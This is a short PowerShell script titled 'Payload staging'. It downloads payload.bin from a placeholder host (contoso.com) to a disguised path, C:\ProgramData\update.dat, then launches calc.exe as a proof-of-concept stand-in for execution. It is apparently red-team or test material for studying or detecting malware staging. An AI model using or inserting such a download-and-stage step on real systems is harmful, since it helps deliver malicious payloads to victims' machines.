<# Payload staging #>
[CmdletBinding()]
param(
    [string]$TargetUrl = 'http://contoso.com:80/downloads/payload.bin',
    [string]$WorkingPath = 'C:\ProgramData\update.dat'
)
(New-Object System.Net.WebClient).DownloadFile($TargetUrl, $WorkingPath)
Start-Process -FilePath 'calc.exe'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
